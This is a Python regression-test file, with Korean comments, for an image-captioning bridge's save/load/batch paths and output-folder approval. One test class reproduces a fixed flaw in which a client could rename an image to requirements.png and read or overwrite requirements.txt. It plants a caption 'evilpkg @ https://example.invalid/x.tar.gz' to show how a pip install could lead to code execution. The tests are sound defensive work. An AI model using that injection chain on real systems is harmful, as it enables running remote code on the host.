"""VueBridge의 Batch/Caption 경계 회귀 테스트."""

from __future__ import annotations

import json
import tempfile
import unittest
from contextlib import contextmanager
from pathlib import Path
from unittest import mock

from PIL import Image

from core.image_captioning import TORIIGATE_BF16_MODEL, CaptionResult, TagPrediction
from ui.vue_bridge import VueBridge


def _image(path: Path, color: str = "navy") -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    Image.new("RGB", (16, 16), color).save(path)
    return path


def _isolate_caption_approvals(test: unittest.TestCase, bridge: VueBridge) -> None:
    """캡션 저장 폴더 승인 목록을 테스트 메모리에만 — 실제 ui_prefs 를 읽거나 쓰지 않는다."""
    bridge._caption_out_dir_approvals = []
    patcher = mock.patch.object(VueBridge, "_persist_caption_out_dir_approvals")
    patcher.start()
    test.addCleanup(patcher.stop)


class _ImmediateThread:
    """startCaptionBatch의 작업을 현재 테스트 스레드에서 즉시 실행한다."""

    def __init__(self, *, target, **_kwargs):
        self._target = target

    def start(self):
        self._target()


class _FailingThread(_ImmediateThread):
    def start(self):
        raise RuntimeError("thread start failed")


class _TrackingCoordinator:
    """Record whether cleanup happens while the shared generation lease is held."""

    def __init__(self):
        self.active = False

    @contextmanager
    def reserve(self, *_args, **_kwargs):
        self.active = True
        try:
            yield
        finally:
            self.active = False


class VueBridgeCaptionPayloadTests(unittest.TestCase):
    def setUp(self):
        self.bridge = VueBridge()
        _isolate_caption_approvals(self, self.bridge)

    def test_legacy_payload_defaults_to_ollama(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            payload, files = self.bridge._prepare_caption_payload(
                {"path": str(image), "model": "vision:latest", "save": False},
                batch=False,
            )

        self.assertEqual(payload["engine"], "ollama")
        self.assertEqual(payload["model"], "vision:latest")
        self.assertEqual(files, [str(image.resolve())])

    def test_caformer_does_not_require_an_ollama_model(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            payload, _ = self.bridge._prepare_caption_payload(
                {"files": [str(image)], "engine": "caformer", "save": False},
                batch=True,
            )

        self.assertEqual(payload["model"], "")
        self.assertEqual(payload["engine"], "caformer")

    def test_torii_mode_rejects_a_text_only_model_name(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            with self.assertRaisesRegex(ValueError, "ToriiGate"):
                self.bridge._prepare_caption_payload(
                    {
                        "files": [str(image)],
                        "engine": "torii",
                        "model": "qwen3:8b",
                        "save": False,
                    },
                    batch=True,
                )

    def test_shared_output_folder_rejects_duplicate_basenames(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            first = _image(root / "a" / "same.png")
            second = _image(root / "b" / "same.png")
            out_dir = root / "captions"
            out_dir.mkdir()  # 폴더 대화상자는 이미 있는 폴더만 돌려준다
            self.bridge.approve_caption_out_dir(str(out_dir))  # = 호스트 대화상자로 고름
            with self.assertRaisesRegex(ValueError, "동명 이미지"):
                self.bridge._prepare_caption_payload(
                    {
                        "files": [str(first), str(second)],
                        "engine": "caformer",
                        "outDir": str(out_dir),
                        "save": True,
                    },
                    batch=True,
                )

    def test_side_by_side_output_rejects_same_stem_different_extensions(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            png = _image(root / "same.png")
            jpg = _image(root / "same.jpg")
            with self.assertRaisesRegex(ValueError, "동명 이미지"):
                self.bridge._prepare_caption_payload(
                    {
                        "files": [str(png), str(jpg)],
                        "engine": "caformer",
                        "save": True,
                    },
                    batch=True,
                )

    def test_caformer_options_match_frontend_payload(self):
        options = self.bridge._caption_caformer_options(
            {
                "includeCharacters": False,
                "includeRating": True,
                "useBestThresholds": False,
                "generalThreshold": 0.31,
                "characterThreshold": 0.44,
                "ratingThreshold": 0.55,
            }
        )
        self.assertEqual(options["thresholdMode"], "category")
        self.assertFalse(options["includeCharacters"])
        self.assertTrue(options["includeRating"])
        self.assertEqual(options["ratingThreshold"], 0.55)

    def test_payload_normalizes_client_job_ids_booleans_and_thresholds(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            payload, _ = self.bridge._prepare_caption_payload(
                {
                    "files": [str(image)],
                    "engine": "caformer",
                    "clientToken": "client token!",
                    "jobId": "job/id",
                    "save": "false",
                    "includeCharacters": "false",
                    "generalThreshold": "0.31",
                },
                batch=True,
            )

        self.assertEqual(payload["clientToken"], "clienttoken")
        self.assertEqual(payload["jobId"], "jobid")
        self.assertFalse(payload["save"])
        self.assertFalse(payload["includeCharacters"])
        self.assertEqual(payload["generalThreshold"], 0.31)

    def test_invalid_threshold_is_rejected_before_worker_start(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            with self.assertRaisesRegex(ValueError, "generalThreshold"):
                self.bridge._prepare_caption_payload(
                    {
                        "files": [str(image)],
                        "engine": "caformer",
                        "save": False,
                        "generalThreshold": 2,
                    },
                    batch=True,
                )

    def test_runtime_snapshot_echoes_client_and_request_identity(self):
        with (
            mock.patch(
                "core.image_captioning.discover_caformer_model",
                return_value=Path("C:/models/caformer"),
            ),
            mock.patch("importlib.util.find_spec", return_value=object()),
            mock.patch(
                "core.ollama_client.OllamaClient.list_models",
                return_value=[TORIIGATE_BF16_MODEL],
            ),
        ):
            result = json.loads(
                self.bridge._caption_runtime_snapshot(
                    {
                        "clientToken": "client-a",
                        "requestId": 17,
                        "toriiModel": TORIIGATE_BF16_MODEL,
                    }
                )
            )

        self.assertEqual(result["clientToken"], "client-a")
        self.assertEqual(result["requestId"], 17)
        self.assertTrue(result["caformer"]["available"])
        self.assertTrue(result["torii"]["available"])


class VueBridgeCaptionSidecarTests(unittest.TestCase):
    def setUp(self):
        self.bridge = VueBridge()
        _isolate_caption_approvals(self, self.bridge)

    def test_save_and_load_use_selected_output_folder_atomically(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            image = _image(root / "images" / "sample.png")
            out_dir = root / "captions"
            out_dir.mkdir()  # 폴더 대화상자는 이미 있는 폴더만 돌려준다
            # 호스트 대화상자(caption_pick_outdir)가 승인한 폴더 — 프론트는 '/' 경로로 보낸다
            self.bridge.approve_caption_out_dir(out_dir.as_posix())
            saved = json.loads(
                self.bridge.saveCaption(
                    json.dumps(
                        {"path": str(image), "caption": "1girl, solo", "outDir": str(out_dir)}
                    )
                )
            )
            loaded = json.loads(
                self.bridge.loadCaption(
                    json.dumps({"path": str(image), "outDir": str(out_dir)})
                )
            )

            target = out_dir / "sample.txt"
            self.assertTrue(saved["ok"])
            self.assertEqual(loaded["caption"], "1girl, solo")
            self.assertEqual(loaded["txtPath"], target.as_posix())
            self.assertEqual(target.read_text(encoding="utf-8"), "1girl, solo")
            self.assertFalse(Path(str(target) + ".tmp").exists())

    def test_manual_save_never_creates_a_missing_output_folder(self):
        """수동 저장은 폴더를 만들지 않는다 — 웹 클라이언트의 임의 mkdir 차단."""
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            image = _image(root / "images" / "sample.png")
            missing = root / "not" / "yet" / "there"
            response = json.loads(
                self.bridge.saveCaption(
                    json.dumps({"path": str(image), "caption": "x", "outDir": str(missing)})
                )
            )
            self.assertNotIn("ok", response)
            self.assertIn("error", response)
            self.assertFalse((root / "not").exists())

    def test_missing_output_folder_is_handled_the_same_by_save_load_and_batch(self):
        """세 경로가 같은 규칙 — 폴더를 만들지 않고, 다시 고르라는 같은 한국어 오류.

        호스트 대화상자로 골라 승인한 폴더가 그 뒤 지워진 경우다(승인 안 된 경로는 있든 없든
        NOT_APPROVED — test_unapproved_answer_does_not_reveal_whether_the_path_exists).
        """
        from core.caption_out_dir import MISSING_MESSAGE

        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            image = _image(root / "images" / "sample.png")
            missing = root / "deleted" / "captions"
            missing.mkdir(parents=True)
            self.bridge.approve_caption_out_dir(str(missing))  # = 호스트 대화상자로 고름
            missing.rmdir()
            (root / "deleted").rmdir()
            common = {"path": str(image), "outDir": str(missing)}
            saved = json.loads(self.bridge.saveCaption(json.dumps({**common, "caption": "x"})))
            loaded = json.loads(self.bridge.loadCaption(json.dumps(common)))
            with (
                mock.patch("ui.vue_bridge.threading.Thread", _ImmediateThread),
                mock.patch.object(self.bridge, "_create_caption_engine", return_value=object()),
                mock.patch.object(self.bridge, "_run_caption_inference") as infer,
            ):
                started = json.loads(self.bridge.startCaptionBatch(json.dumps({
                    "files": [str(image)], "engine": "caformer", "save": True,
                    "outDir": str(missing), "clientToken": "c", "jobId": "j",
                })))

            for name, response in (("save", saved), ("load", loaded), ("batch", started)):
                with self.subTest(slot=name):
                    self.assertEqual(response.get("error"), MISSING_MESSAGE)
                    self.assertNotIn("[path]", response["error"])
            self.assertFalse(started.get("started", False))
            infer.assert_not_called()
            self.assertFalse((root / "deleted").exists(), "어떤 경로도 폴더를 새로 만들지 않는다")
            self.assertFalse((root / "images" / "sample.txt").exists(), "이미지 옆으로 몰래 떨어지지도 않는다")

    def test_batch_without_save_ignores_a_stale_output_folder(self):
        """저장하지 않으면 outDir 는 오류 없이 무시된다 — 검증 안 된 원문으로 경로도 만들지 않는다."""
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            image = _image(root / "image.png")
            unapproved = root / "exists_but_not_picked"
            unapproved.mkdir()
            for raw in (root / "gone", unapproved):
                with self.subTest(outDir=raw.name):
                    payload, _ = self.bridge._prepare_caption_payload(
                        {"files": [str(image)], "engine": "caformer", "save": False,
                         "outDir": str(raw)},
                        batch=True,
                    )
                    self.assertEqual(payload["outDir"], "")
            self.assertFalse((root / "gone").exists())

            self.bridge.approve_caption_out_dir(str(unapproved))
            payload, _ = self.bridge._prepare_caption_payload(
                {"files": [str(image)], "engine": "caformer", "save": False,
                 "outDir": str(unapproved)},
                batch=True,
            )
            self.assertEqual(payload["outDir"], str(unapproved.resolve()))

    def test_blank_existing_sidecar_is_regenerated(self):
        result = CaptionResult(
            "caformer",
            tags=(TagPrediction("solo", 0.9, "general"),),
        )
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            image = _image(root / "image.png")
            sidecar = root / "image.txt"
            sidecar.write_text("   ", encoding="utf-8")
            progress: list[dict] = []
            completed: list[dict] = []
            self.bridge.captionProgress.connect(lambda value: progress.append(json.loads(value)))
            self.bridge.captionDone.connect(lambda value: completed.append(json.loads(value)))

            with (
                mock.patch("ui.vue_bridge.threading.Thread", _ImmediateThread),
                mock.patch.object(self.bridge, "_create_caption_engine", return_value=object()),
                mock.patch.object(self.bridge, "_run_caption_inference", return_value=result) as infer,
            ):
                started = json.loads(
                    self.bridge.startCaptionBatch(
                        json.dumps(
                            {
                                "files": [str(image)],
                                "engine": "caformer",
                                "save": True,
                                "overwrite": False,
                            }
                        )
                    )
                )

            self.assertTrue(started["started"])
            infer.assert_called_once()
            self.assertEqual(sidecar.read_text(encoding="utf-8"), "solo")
            self.assertFalse(progress[0].get("skipped", False))
            self.assertEqual(completed[0]["ok"], 1)
            self.assertEqual(completed[0]["failed"], 0)

    def test_manual_save_is_rejected_while_caption_job_owns_sidecars(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            image = _image(root / "image.png")
            self.assertTrue(self.bridge._caption_job_lock.acquire(blocking=False))
            try:
                response = json.loads(
                    self.bridge.saveCaption(
                        json.dumps({"path": str(image), "caption": "must not write"})
                    )
                )
            finally:
                self.bridge._caption_job_lock.release()

            self.assertIn("error", response)
            self.assertFalse((root / "image.txt").exists())


class VueBridgeCaptionJobTests(unittest.TestCase):
    def setUp(self):
        self.bridge = VueBridge()
        _isolate_caption_approvals(self, self.bridge)

    def _start_immediately(self, image: Path, inference):
        progress: list[dict] = []
        completed: list[dict] = []
        self.bridge.captionProgress.connect(lambda value: progress.append(json.loads(value)))
        self.bridge.captionDone.connect(lambda value: completed.append(json.loads(value)))
        with (
            mock.patch("ui.vue_bridge.threading.Thread", _ImmediateThread),
            mock.patch.object(self.bridge, "_create_caption_engine", return_value=object()),
            mock.patch.object(self.bridge, "_run_caption_inference", side_effect=inference),
        ):
            started = json.loads(
                self.bridge.startCaptionBatch(
                    json.dumps(
                        {
                            "files": [str(image)],
                            "engine": "caformer",
                            "save": False,
                            "clientToken": "client-a",
                            "jobId": "job-a",
                        }
                    )
                )
            )
        return started, progress, completed

    def test_job_identity_is_echoed_and_done_state_recovers_missed_signals(self):
        result = CaptionResult(
            "caformer", tags=(TagPrediction("solo", 0.9, "general"),)
        )
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            started, progress, completed = self._start_immediately(image, lambda *_: result)

        self.assertEqual(started["clientToken"], "client-a")
        self.assertEqual(started["jobId"], "job-a")
        self.assertEqual(progress[0]["clientToken"], "client-a")
        self.assertEqual(progress[0]["jobId"], "job-a")
        self.assertEqual(completed[0]["succeeded"], 1)
        status = json.loads(
            self.bridge.getCaptionJobStatus(
                json.dumps({"clientToken": "client-a", "jobId": "job-a"})
            )
        )
        self.assertEqual(status["status"], "done")
        self.assertEqual(status["processed"], 1)
        self.assertEqual(status["items"][0]["caption"], "solo")

    def test_saved_progress_and_recovery_include_exact_sidecar_path(self):
        result = CaptionResult(
            "caformer", tags=(TagPrediction("solo", 0.9, "general"),)
        )
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            image = _image(root / "images" / "image.png")
            out_dir = root / "captions"
            out_dir.mkdir()  # 폴더 대화상자는 이미 있는 폴더만 돌려준다
            self.bridge.approve_caption_out_dir(str(out_dir))  # = 호스트 대화상자로 고름
            progress: list[dict] = []
            self.bridge.captionProgress.connect(lambda value: progress.append(json.loads(value)))
            with (
                mock.patch("ui.vue_bridge.threading.Thread", _ImmediateThread),
                mock.patch.object(self.bridge, "_create_caption_engine", return_value=object()),
                mock.patch.object(self.bridge, "_run_caption_inference", return_value=result),
            ):
                response = json.loads(
                    self.bridge.startCaptionBatch(
                        json.dumps(
                            {
                                "files": [str(image)],
                                "engine": "caformer",
                                "save": True,
                                "outDir": str(out_dir),
                                "clientToken": "client-sidecar",
                                "jobId": "job-sidecar",
                            }
                        )
                    )
                )

            status = json.loads(
                self.bridge.getCaptionJobStatus(
                    json.dumps(
                        {"clientToken": response["clientToken"], "jobId": response["jobId"]}
                    )
                )
            )
            expected = (out_dir / "image.txt").as_posix()
            self.assertEqual(progress[0]["txtPath"], expected)
            self.assertEqual(status["items"][0]["txtPath"], expected)

    def test_batch_unloads_torii_inside_lease_but_not_caformer(self):
        result = CaptionResult("torii", natural_caption="A visible subject.")
        coordinator = _TrackingCoordinator()
        unload_lease_states: list[bool] = []
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            with (
                mock.patch("ui.vue_bridge.threading.Thread", _ImmediateThread),
                mock.patch(
                    "core.resource_coordinator.get_generation_coordinator",
                    return_value=coordinator,
                ),
                mock.patch.object(self.bridge, "_create_caption_engine", return_value=object()),
                mock.patch.object(self.bridge, "_run_caption_inference", return_value=result),
                mock.patch(
                    "core.ollama_client.OllamaClient.unload",
                    autospec=True,
                    side_effect=lambda _client: unload_lease_states.append(coordinator.active),
                ),
            ):
                torii_response = json.loads(
                    self.bridge.startCaptionBatch(
                        json.dumps(
                            {
                                "files": [str(image)],
                                "engine": "torii",
                                "model": TORIIGATE_BF16_MODEL,
                                "save": False,
                                "clientToken": "client-lease",
                                "jobId": "job-lease",
                            }
                        )
                    )
                )
                self.bridge._run_caption_inference.return_value = CaptionResult(
                    "caformer", tags=(TagPrediction("solo", 0.9, "general"),)
                )
                caformer_response = json.loads(
                    self.bridge.startCaptionBatch(
                        json.dumps(
                            {
                                "files": [str(image)],
                                "engine": "caformer",
                                "save": False,
                                "unloadAfter": True,
                                "clientToken": "client-caformer",
                                "jobId": "job-caformer",
                            }
                        )
                    )
                )

        self.assertTrue(torii_response["started"])
        self.assertTrue(caformer_response["started"])
        self.assertEqual(unload_lease_states, [True])

    def test_all_item_failures_report_first_error_and_consistent_counts(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            _, progress, completed = self._start_immediately(
                image, lambda *_: (_ for _ in ()).throw(RuntimeError("inference boom"))
            )

        self.assertEqual(progress[0]["error"], "inference boom")
        done = completed[0]
        self.assertEqual(done["ok"], 0)
        self.assertEqual(done["succeeded"], 0)
        self.assertEqual(done["failed"], 1)
        self.assertEqual(done["processed"], 1)
        self.assertEqual(done["error"], "inference boom")
        self.assertEqual(done["ok"] + done["failed"], done["total"])

    def test_thread_start_failure_releases_job_lock_and_journals_error(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            image = _image(Path(temp_dir) / "image.png")
            with mock.patch("ui.vue_bridge.threading.Thread", _FailingThread):
                response = json.loads(
                    self.bridge.startCaptionBatch(
                        json.dumps(
                            {
                                "files": [str(image)],
                                "engine": "caformer",
                                "save": False,
                                "clientToken": "client-a",
                                "jobId": "job-start-fail",
                            }
                        )
                    )
                )

            self.assertIn("thread start failed", response["error"])
            self.assertTrue(self.bridge._caption_job_lock.acquire(blocking=False))
            self.bridge._caption_job_lock.release()
            status = json.loads(
                self.bridge.getCaptionJobStatus(
                    json.dumps({"clientToken": "client-a", "jobId": "job-start-fail"})
                )
            )
            self.assertEqual(status["status"], "done")
            self.assertIn("thread start failed", status["error"])
            self.assertEqual(status["failed"], 1)
            self.assertEqual(status["processed"], 1)
            self.assertIn("thread start failed", status["items"][0]["error"])

    def test_unknown_job_status_does_not_leak_another_clients_results(self):
        status = json.loads(
            self.bridge.getCaptionJobStatus(
                json.dumps({"clientToken": "client-b", "jobId": "unknown"})
            )
        )
        self.assertEqual(status["status"], "idle")
        self.assertEqual(status["clientToken"], "client-b")


class _PrefsHost:
    """save_ui_prefs 분기만 도는 GeneratorMainUI 대역(설정 적용 부수효과는 끈다)."""

    def __init__(self, bridge):
        from ui.generator_main import GeneratorMainUI
        from ui.model_download_actions import ModelDownloadActionsMixin
        self.vue_bridge = bridge
        self._dispatch = GeneratorMainUI._handle_vue_action
        self._handle_model_download_action = (
            lambda action, payload: ModelDownloadActionsMixin._handle_model_download_action(
                self, action, payload))

    def handle(self, action, payload):
        self._dispatch(self, action, payload)

    def _handle_chat_action(self, *_args):
        return False

    def _handle_creator_action(self, *_args):
        return False

    def _apply_ui_prefs_to_cleaner(self, _prefs):
        pass

    def _apply_anima_guard_prefs(self, _prefs):
        pass

    def _apply_theme_prefs(self, _prefs):
        pass

    def show_status(self, *_args):
        pass


class CaptionOutDirApprovalTests(unittest.TestCase):
    """Codex R3 #0 — outDir 는 클라이언트가 보내는 값이다.

    renameFile 로 갤러리 이미지를 requirements.png 로 바꾸고 outDir 에 아무 폴더나 주면
    loadCaption 은 그 폴더의 requirements.txt 를 돌려주고 saveCaption 은 덮어썼다(앱 폴더면 다음
    실행 때 check_requirements 가 그 목록을 pip 설치 → 호스트 코드 실행). 일괄 처리의 '기존 캡션
    건너뛰기'는 그 내용을 captionProgress 로 방송했다. 이제 호스트 대화상자가 승인한 폴더만 쓴다.
    """

    SECRET = "secret-token=ABC123\nnumpy==1.0\n"

    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.root = Path(temp.name)
        self.prefs_path = self.root / "config" / "ui_prefs.json"
        patcher = mock.patch("core.ui_prefs.ui_prefs_path", return_value=str(self.prefs_path))
        patcher.start()
        self.addCleanup(patcher.stop)
        self.bridge = VueBridge()
        self.victim = self.root / "victim"
        self.victim.mkdir()
        self.target = self.victim / "requirements.txt"
        self.target.write_bytes(self.SECRET.encode("utf-8"))
        renamed = json.loads(self.bridge.renameFile(
            str(_image(self.root / "gallery" / "pasted.png")), "requirements"))
        self.assertTrue(renamed.get("ok"), renamed)
        self.image = Path(renamed["new_path"])

    def _every_caption_slot(self, bridge, out_dir, caption="evilpkg @ https://example.invalid/x.tar.gz\n"):
        common = {"path": str(self.image), "outDir": str(out_dir)}
        progress: list[dict] = []
        bridge.captionProgress.connect(lambda value: progress.append(json.loads(value)))
        loaded = json.loads(bridge.loadCaption(json.dumps(common)))
        saved = json.loads(bridge.saveCaption(json.dumps({**common, "caption": caption})))
        with (
            mock.patch("ui.vue_bridge.threading.Thread", _ImmediateThread),
            mock.patch.object(bridge, "_create_caption_engine", return_value=object()),
            mock.patch.object(bridge, "_run_caption_inference") as infer,
        ):
            started = json.loads(bridge.startCaptionBatch(json.dumps({
                "files": [str(self.image)], "engine": "caformer", "save": True,
                "overwrite": False, "outDir": str(out_dir), "clientToken": "c", "jobId": "j",
            })))
        return {"load": loaded, "save": saved, "batch": started}, progress, infer

    def test_unapproved_folder_is_refused_by_every_caption_slot(self):
        from core.caption_out_dir import NOT_APPROVED_MESSAGE

        for web_mode in (False, True):
            with self.subTest(web_mode=web_mode), mock.patch.object(
                VueBridge, "_backend_runtime_is_web_mode", return_value=web_mode,
            ):
                bridge = VueBridge()
                responses, progress, infer = self._every_caption_slot(bridge, self.victim)
                for name, response in responses.items():
                    with self.subTest(slot=name):
                        self.assertEqual(response.get("error"), NOT_APPROVED_MESSAGE)
                        self.assertNotIn("secret-token", json.dumps(response, ensure_ascii=False))
                self.assertEqual(progress, [], "기존 .txt 내용이 방송되지 않는다")
                infer.assert_not_called()
                self.assertEqual(self.target.read_bytes(), self.SECRET.encode("utf-8"))
                self.assertEqual(sorted(p.name for p in self.victim.iterdir()), ["requirements.txt"])
        self.assertFalse(self.prefs_path.exists(), "거부만 했으니 설정 파일을 만들지 않는다")

    def test_unapproved_answer_does_not_reveal_whether_the_path_exists(self):
        """Codex R3 재검토 — 승인 안 된 outDir 는 없는 경로·파일·있는 폴더 모두 같은 오류.

        예전엔 존재·종류 검사가 승인 검사보다 먼저라 loadCaption/saveCaption 오류 문구
        (MISSING / NOT_A_FOLDER / NOT_APPROVED)로 호스트 경로의 존재·종류가 드러났다.
        """
        from core.caption_out_dir import NOT_APPROVED_MESSAGE

        candidates = {
            "missing": self.root / "no" / "such" / "folder",
            "file": self.target,
            "folder": self.victim,
        }
        for web_mode in (False, True):
            with mock.patch.object(VueBridge, "_backend_runtime_is_web_mode", return_value=web_mode):
                bridge = VueBridge()
                answers = {}
                for kind, out_dir in candidates.items():
                    common = {"path": str(self.image), "outDir": str(out_dir)}
                    answers[("load", kind)] = json.loads(bridge.loadCaption(json.dumps(common))).get("error")
                    answers[("save", kind)] = json.loads(
                        bridge.saveCaption(json.dumps({**common, "caption": "x"}))).get("error")
                with self.subTest(web_mode=web_mode):
                    self.assertEqual(set(answers.values()), {NOT_APPROVED_MESSAGE}, answers)
        self.assertFalse((self.root / "no").exists())
        self.assertEqual(self.target.read_bytes(), self.SECRET.encode("utf-8"))

    def test_host_dialog_approval_is_persisted_and_unlocks_the_folder(self):
        from core.caption_out_dir import APPROVED_PREFS_KEY

        picked = self.root / "captions"
        picked.mkdir()
        self.assertEqual(self.bridge.approve_caption_out_dir(picked.as_posix()), str(picked.resolve()))
        stored = json.loads(self.prefs_path.read_text(encoding="utf-8"))
        self.assertEqual(stored[APPROVED_PREFS_KEY], [str(picked.resolve())])

        fresh = VueBridge()   # 다음 실행 — 승인은 ui_prefs 에서 다시 읽는다
        common = {"path": str(self.image), "outDir": picked.as_posix()}
        saved = json.loads(fresh.saveCaption(json.dumps({**common, "caption": "1girl"})))
        loaded = json.loads(fresh.loadCaption(json.dumps(common)))
        self.assertTrue(saved.get("ok"), saved)
        self.assertEqual(loaded.get("caption"), "1girl")
        self.assertEqual((picked / "requirements.txt").read_text(encoding="utf-8"), "1girl")
        # 서버 전용 승인 목록은 클라이언트에게 가는 설정 사본에 없다
        self.assertNotIn(APPROVED_PREFS_KEY, json.loads(fresh.getUiPrefs()))
        self.assertNotIn(APPROVED_PREFS_KEY, fresh._ui_prefs_dict())

    def test_system_folder_is_never_approved(self):
        from core.caption_out_dir import CaptionOutDirError

        anchor = self.root.resolve().anchor or "/"
        with self.assertRaises(CaptionOutDirError):
            self.bridge.approve_caption_out_dir(anchor)
        self.assertEqual(self.bridge.approved_caption_out_dirs(), [])

    def test_client_save_ui_prefs_cannot_mint_an_approval(self):
        from core.caption_out_dir import APPROVED_PREFS_KEY, NOT_APPROVED_MESSAGE

        picked = self.root / "picked"
        picked.mkdir()
        self.bridge.approve_caption_out_dir(str(picked))
        host = _PrefsHost(self.bridge)
        with mock.patch("core.forge_output_policy.update_forge_save_outputs_from_prefs"):
            host.handle("save_ui_prefs", {
                APPROVED_PREFS_KEY: [str(self.victim)],
                "captionOutDir": self.victim.as_posix(),
                "captionEngine": "caformer",
            })
            stored = json.loads(self.prefs_path.read_text(encoding="utf-8"))
            self.assertEqual(stored[APPROVED_PREFS_KEY], [str(picked.resolve())])
            self.assertNotIn("captionOutDir", stored, "승인 안 된 폴더는 저장값이 되지 못한다")
            self.assertEqual(stored["captionEngine"], "caformer")

            # 승인된 폴더·기본값(이미지 옆)은 그대로 저장된다
            host.handle("save_ui_prefs", {"captionOutDir": picked.as_posix()})
            stored = json.loads(self.prefs_path.read_text(encoding="utf-8"))
            self.assertEqual(stored["captionOutDir"], picked.as_posix())
            host.handle("save_ui_prefs", {"captionOutDir": ""})
            stored = json.loads(self.prefs_path.read_text(encoding="utf-8"))
            self.assertEqual(stored["captionOutDir"], "")

        fresh = VueBridge()
        loaded = json.loads(fresh.loadCaption(json.dumps(
            {"path": str(self.image), "outDir": str(self.victim)})))
        self.assertEqual(loaded.get("error"), NOT_APPROVED_MESSAGE)

    def _write_prefs(self, prefs: dict) -> None:
        self.prefs_path.parent.mkdir(parents=True, exist_ok=True)
        self.prefs_path.write_text(json.dumps(prefs), encoding="utf-8")

    def test_desktop_seeds_the_previously_picked_folder_once(self):
        from core.caption_out_dir import APPROVED_PREFS_KEY

        picked = self.root / "picked_before_the_rule"
        picked.mkdir()
        self._write_prefs({"captionOutDir": picked.as_posix(), "theme": "dark"})
        self.assertTrue(self.bridge.seed_caption_out_dir_approval_from_prefs())
        stored = json.loads(self.prefs_path.read_text(encoding="utf-8"))
        self.assertEqual(stored[APPROVED_PREFS_KEY], [str(picked.resolve())])
        self.assertEqual(stored["theme"], "dark")

        # 키가 생긴 뒤에는 다시 옮기지 않는다 — 이후 값은 save_ui_prefs 가 승인된 것만 받는다
        stored["captionOutDir"] = self.victim.as_posix()
        self._write_prefs(stored)
        fresh = VueBridge()
        self.assertFalse(fresh.seed_caption_out_dir_approval_from_prefs())
        self.assertEqual(fresh.approved_caption_out_dirs(), [str(picked.resolve())])

    def test_seed_without_a_usable_folder_still_marks_the_migration_done(self):
        from core.caption_out_dir import APPROVED_PREFS_KEY

        self._write_prefs({"captionOutDir": (self.root / "deleted").as_posix()})
        self.assertFalse(self.bridge.seed_caption_out_dir_approval_from_prefs())
        stored = json.loads(self.prefs_path.read_text(encoding="utf-8"))
        self.assertEqual(stored[APPROVED_PREFS_KEY], [])

    def test_web_mode_never_seeds(self):
        from core.caption_out_dir import APPROVED_PREFS_KEY

        self._write_prefs({"captionOutDir": self.victim.as_posix()})
        with mock.patch.object(VueBridge, "_backend_runtime_is_web_mode", return_value=True):
            self.assertFalse(self.bridge.seed_caption_out_dir_approval_from_prefs())
        self.assertNotIn(APPROVED_PREFS_KEY, json.loads(self.prefs_path.read_text(encoding="utf-8")))
        self.assertEqual(self.bridge.approved_caption_out_dirs(), [])


class CaptionAppInstallGuardTests(unittest.TestCase):
    """웹 모드의 두 번째 벽 — 이미지 옆 사이드카로도 앱 설치 폴더의 .txt 에 닿지 못한다."""

    SECRET = "pillow\nsecret-line\n"

    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.root = Path(temp.name)
        self.app = self.root / "Image viewer"
        self.output = self.app / "generated_images"
        self.output.mkdir(parents=True)
        for patcher in (
            mock.patch("core.storage_paths.PROJECT_ROOT", self.app),
            mock.patch("config.OUTPUT_DIR", str(self.output)),
        ):
            patcher.start()
            self.addCleanup(patcher.stop)
        self.bridge = VueBridge()
        _isolate_caption_approvals(self, self.bridge)
        self.requirements = self.app / "requirements.txt"
        self.requirements.write_bytes(self.SECRET.encode("utf-8"))
        self.image = _image(self.app / "requirements.png")   # renameFile 로 만들 수 있는 이름

    def _web(self, on: bool):
        return mock.patch.object(VueBridge, "_backend_runtime_is_web_mode", return_value=on)

    def test_web_mode_refuses_app_files_next_to_the_image_and_in_an_approved_app_folder(self):
        from core.caption_out_dir import PROTECTED_TARGET_MESSAGE

        self.bridge.approve_caption_out_dir(str(self.app))   # 호스트가 실수로 앱 폴더를 골라도
        for out_dir in ("", str(self.app)):
            with self.subTest(outDir=out_dir or "(이미지 옆)"), self._web(True):
                common = {"path": str(self.image), "outDir": out_dir}
                loaded = json.loads(self.bridge.loadCaption(json.dumps(common)))
                saved = json.loads(self.bridge.saveCaption(json.dumps({**common, "caption": "evil"})))
                with self.assertRaises(ValueError) as ctx:
                    self.bridge._prepare_caption_payload(
                        {"files": [str(self.image)], "engine": "caformer", "save": True,
                         "outDir": out_dir},
                        batch=True,
                    )
                for response in (loaded, saved):
                    self.assertEqual(response.get("error"), PROTECTED_TARGET_MESSAGE)
                    self.assertNotIn("secret-line", json.dumps(response, ensure_ascii=False))
                self.assertEqual(str(ctx.exception), PROTECTED_TARGET_MESSAGE)
                self.assertEqual(self.requirements.read_bytes(), self.SECRET.encode("utf-8"))

    def test_web_mode_still_captions_generated_images_and_desktop_is_unchanged(self):
        generated = _image(self.output / "00001-1.png")
        with self._web(True):
            saved = json.loads(self.bridge.saveCaption(json.dumps(
                {"path": str(generated), "caption": "1girl"})))
